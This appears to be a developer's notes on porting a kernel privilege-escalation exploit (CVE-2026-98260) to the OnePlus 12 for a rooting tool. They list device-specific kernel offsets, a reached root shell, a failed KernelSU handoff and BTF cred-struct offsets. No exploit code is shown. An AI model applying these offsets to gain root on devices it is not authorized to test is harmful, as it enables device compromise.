# OnePlus 12 (CPH2573) — 6.1.157 experiment

Status: **exploratory / no Shark support yet**

```text
device     CPH2573 (OnePlus 12, India)
build      CPH2573_17.0.0.100(EX01)
kernel     6.1.157-android14-11-o-g3d5d51510424
security   2026-11-01
```

## Why this is not a table entry

Shark's runners currently cover `6.6.118`, `6.12.x`, and `6.18.21`.
There is no 6.1 chain, so `PROFILE_BY_RELEASE` has nothing to map OP12 to
and the app shows `Unsupported device`.

## What was verified separately

CVE-2026-98260 is applicable to the stock image:

```text
timer-extract: vulnerable YES
timer site:    0xffffffc00844bcac
task cred:     0x838
cred uid:      +4
timer alloc:   0x108
```

A timer shell reached:

```text
uid=0(root) ... context=u:r:shell:s0
Enforcing
```

The KernelSU fake path reached `stage fake_cred` and `stage selinux`, then the
device rebooted; `su` did not appear.

## Implementation options

1. Add a 6.1 runner with the same `run` contract as `libk66118.so`, carrying
   the OP12 profile and the 6.1 cred/task layout.
2. Adapt the GPL-3.0 6.1 `ic-timer-lpe` core (KSU handoff and on-device
   profile resolver) behind a Shark feature flag.
3. Keep Shark for 6.6/6.12/6.18 and use a separate 6.1 experiment until the
   fake/KSU stage is stable.

This branch is for option 1/2 exploration; it is not a release target.

## 6.1 core experiment

The GPL-3.0 `ic-timer-lpe` 6.1 core was given an `IC_PROFILE_OP12_61157`
profile:

```text
timer site  0xffffffc00844bcac
task cred   0x838
cred uid    +4
timer alloc 0x108
```

`ic-op12 ids` passed:

```text
[ids] page_alloc=265 page_free=263 pairs=1029
```

`PAYLOAD_CMD=... ic-op12 ksu` rebooted the device immediately and produced no
KSU. The first suspect is the assumed 6.1 cred field offsets: the core profile
uses the QEMU 6.1 layout, but OP12's BTF must be checked before the next run.

Current status:

```text
root shell (timer)   works
KSU fake/core ksu    reboots, no KSU
Shark app             still unsupported
```

## BTF check

The OP12 `Image` was extracted from the boot image and its BTF dumped:

```text
usage            0x00 (atomic_t)
uid              0x04
securebits       0x24
cap_inheritable  0x28
cap_permitted    0x30
cap_effective    0x38
cap_bset         0x40
cap_ambient      0x48
security         0x78
user             0x80
user_ns          0x88
ucounts          0x90
group_info       0x98
```

This matches the `IC_PROFILE_OP12_61157` assumptions. The `ic-op12 ksu`
reboot is therefore not explained by a wrong cred layout; the next suspect is
the fake/late-load/handoff path itself. `IC_LOG_PATH` and a clean-boot run are
needed before changing offsets.
